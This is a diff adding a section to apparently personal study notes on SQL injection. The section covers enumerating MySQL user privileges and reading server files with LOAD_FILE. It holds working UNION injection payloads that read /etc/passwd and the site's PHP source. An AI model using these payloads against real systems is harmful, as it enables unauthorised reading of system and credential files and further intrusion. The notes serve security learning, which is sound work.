@@ -824,3 +824,82 @@ now we have all the info we need to dump data from the credentials table in the 
 
 ![](Images/Pasted%20image%2020240129162728.png)
 
+## Reading Files
+
+sql injections can also be used to read and write files on the server and gain RCE on the backend server 
+
+### Privileges
+
+reading is much more common than writing, which is strictly reserved for privileged users in modern DBMSs 
+
+in MySQL the db user must have the `FILE` privilege to load a file's content into a table, then dump that data to read it 
+
+### DB user 
+
+first we need to determine which user we are in the database   
+we don't always need DBA privileges to read data, but it is becoming more common to need them 
+
+we can use these queries to find our current DB user: 
+- `SELECT USER()` 
+- `SELECT CURRENT_USER()` 
+- `SELECT user from mysql.user`
+
+our UNION payload will be: 
+
+`cn' UNION SELECT 1,user(), 3, 4-- `
+
+or: 
+
+`cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- `
+
+![](Images/Pasted%20image%2020240129183508.png)
+
+### User privileges
+
+we can first check if we have super admin privileges with: 
+
+`SELECT super_priv FROM mysql.user`
+
+`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user`
+
+if we have many users we can also add `WHERE user="user"`
+
+![](Images/Pasted%20image%2020240129183725.png)
+
+Y = YES showing that we do have super privileges 
+
+we can also dump other privileges we have directly from the schema: 
+
+`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM INFORMATION_SCHEMA.USER_PRIVILEGES-- `
+
+we could also add `WHERE grantee="'root'@'localhost'"`
+
+![](Images/Pasted%20image%2020240129183910.png)
+
+we can see that the `FILE` privilege is given to our user meaning that we can read files and potentially write them 
+
+### LOAD_FILE
+
+`LOAD_FILE()` is a function that can be used in MySQL or MariaDB that reads data from files   
+takes in one argument that is the file name
+
+`SELECT LOAD_FILE('/etc/passwd');`
+
+we will only be able to read the file if the OS user running MySQL has privileges to read it 
+
+our injection will become: 
+
+`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- `
+
+![](Images/Pasted%20image%2020240129184613.png)
+
+### Another example 
+
+we can try to read the source code of the file that we are on with: 
+
+`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- `
+
+![](Images/Pasted%20image%2020240129184752.png)
+
+![](Images/Pasted%20image%2020240129184813.png)
+
